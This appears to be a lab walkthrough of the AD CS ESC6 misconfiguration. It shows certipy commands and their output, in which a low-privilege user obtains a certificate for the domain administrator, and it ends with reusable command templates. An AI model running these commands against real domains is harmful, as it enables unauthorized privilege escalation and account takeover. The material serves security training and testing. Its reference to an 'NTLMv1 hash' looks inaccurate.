The ESC6 vulnerability in Active Directory Certificate Services (AD CS) arises when the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set on the Certificate Authority (CA), allowing user-defined values in the Subject Alternative Name (SAN) field of certificate requests. 

Although Microsoft addressed this issue in the May 2022 Security Updates (CVE-2022-26923), it is essential to ensure that configurations are up-to-date, as some organisations may still be at risk. If the updates are not applied and the flag is enabled, all templates permitting SAN specification in the Certificate Signing Request (CSR) are vulnerable, including the built-in User template. 

This allows for potential exploitation and privilege escalation, particularly when implementing Smart Card logon. The `EDITF_ATTRIBUTESUBJECTALTNAME2` flag can be exploited to request certificates with any user designated as an additional User Principal Name (UPN).

```bash
garffff@garffff:~/GOAD/adcs/esc6$ certipy req -u khal.drogo@essos.local -p 'horse' -template User -ca ESSOS-CA -upn administrator@essos.local -dc-ip 192.168.56.23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 111
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Request the NTLMv1 hash for the targeted user:

```bash
garffff@garffff:~/GOAD/adcs/esc6$ certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Should the error `KDC_ERR_PADATA_TYPE_NOSUPP` happen, following the `Pass-the-cert` attack.

### Summary

```bash
certipy req -u <username>@<domain> -p '<password>' -template User -ca <ca> -upn <target_user>@<domain> -dc-ip <adcs_ip>
certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
```